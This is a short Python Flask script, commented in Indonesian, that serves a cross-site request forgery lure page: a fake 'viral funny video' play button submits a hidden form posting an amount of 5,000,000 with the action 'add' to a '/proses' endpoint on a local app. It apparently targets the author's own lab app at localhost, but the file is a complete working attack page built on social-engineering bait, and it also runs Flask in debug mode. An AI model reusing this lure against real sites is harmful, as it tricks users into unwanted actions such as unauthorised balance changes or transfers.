from flask import Flask, render_template_string

app = Flask(__name__)

@app.route('/')
def csrf_attack():
    return render_template_string('''
        <h1>Video Lucu Viral Banget 😂</h1>
        <p>Klik tombol play untuk menonton:</p>
        <img src="/static/play.png" style="width:200px; cursor:pointer;" onclick="document.forms[0].submit();">

        <!-- Form tersembunyi untuk serangan CSRF -->
        <form action="http://127.0.0.1:5000/proses" method="post" style="display: none;">
            <input type="hidden" name="jumlah" value="5000000">
            <input type="hidden" name="aksi" value="tambah">
        </form>
    ''')

if __name__ == '__main__':
    app.run(port=5001, debug=True)

#saya hanya bisa ucap alhamdulillah